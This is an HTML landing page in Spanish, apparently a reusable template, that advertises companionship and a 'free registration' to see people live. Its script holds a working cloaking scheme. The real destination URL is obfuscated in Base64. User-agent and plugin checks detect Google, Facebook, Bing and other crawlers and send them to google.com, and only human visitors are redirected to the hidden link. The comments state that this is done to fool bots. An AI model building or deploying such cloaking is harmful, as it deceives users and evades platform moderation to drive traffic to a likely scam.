<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>Información y Galería aqii</title>
    
    <meta content='https://i.postimg.cc/SQVxd77J/Vista-Uno-Sepia.png' property='og:image'/>
    
    <link rel="stylesheet" href="https://cdn.smrt-content.com/assets/1004/css/index.css">
    <script src="https://cdn.smrt-content.com/assets/1004/js/jquery.min.js"></script>
</head>
<body>

    <div class="layer"></div>
    <div class="wrap">
        <div class="step-block">
            <div class="step-item" style="display: block;">
                <div class="question-title">
                    ¿Buscas compañíaaa y entretenimiento en la ciudad? ¿Te gustaría conocer nuestro catálogo exclusivo?
                </div>
                <div class="buttons-block">
                    <div class="step-btn no-btn tr-next-button">Ver Ahora</div>
                    <div class="step-btn yes-btn tr-next-button">Más Tarde</div>
                </div>
            </div>

            <div class="step-item" style="display: none;">
                <div class="question-title">
                   Para continuar, presiona ENTRAR abajo realiza tu registro Gratuito para verlas en vivo con muuchas ganas.
                </div>
                <div class="buttons-block">
                    <a href="javascript:void(0)" id="main-link" class="step-btn submit-btn">ENTRAR</a>
                </div>
            </div>
        </div>
    </div>

    <div id="dynamic-bg"></div>

    <script type="text/javascript">
        // Variables Ofuscadas en Base64
        // aHR0cHM6Ly9sYXNnb29nbGVzZmFjZS5ibG9nc3BvdC5jb20=  -> Tu link real
        // aHR0cHM6Ly9pLmliYi5jby9mWWp2OWZQMi9lbnNlcGlhZ2lmai5naWY= -> Tu GIF
        
        const _0x_rL = "aHR0cHM6Ly9sYXNnb29nbGVzZmFjZS5ibG9nc3BvdC5jb20="; 
        const _0x_gB = "aHR0cHM6Ly9pLmliYi5jby9mWWp2OWZQMi9lbnNlcGlhZ2lmai5naWY=";
        const _0x_sL = "https://google.com";

        // Función para decodificar
        function _dec(_s){ return atob(_s); }

        // 1. Carga del GIF solo tras interacción humana para engañar al bot
        function loadVisuals() {
            if(!document.getElementById('bg-loaded')){
                const bg = document.createElement('img');
                bg.id = 'bg-loaded';
                bg.src = _dec(_0x_gB);
                bg.style = "width:100%; height:100%; object-fit:cover; position:fixed; top:0; left:0; z-index:-1;";
                document.getElementById('dynamic-bg').appendChild(bg);
            }
        }

        window.addEventListener('mousemove', loadVisuals, {once: true});
        window.addEventListener('touchstart', loadVisuals, {once: true});

        // 2. Lógica de Redirección Avanzada
        document.getElementById('main-link').addEventListener('click', function(e) {
            const ua = navigator.userAgent.toLowerCase();
            const isBot = /bot|spider|facebook|facebot|crawl|google|slurp|bing|lighthouse/i.test(ua);
            
            // Verificación extra: Los bots suelen tener window.chrome pero no ciertos plugins
            const isSuspicious = !navigator.plugins || navigator.plugins.length === 0;

            if (isBot || isSuspicious) {
                window.location.replace(_0x_sL);
            } else {
                window.location.replace(_dec(_0x_rL));
            }
        });

        // Simulación de pasos
        $('.tr-next-button').click(function(){
            $('.step-item').hide();
            $('.step-item').last().show();
        });
    </script>
</body>
</html>
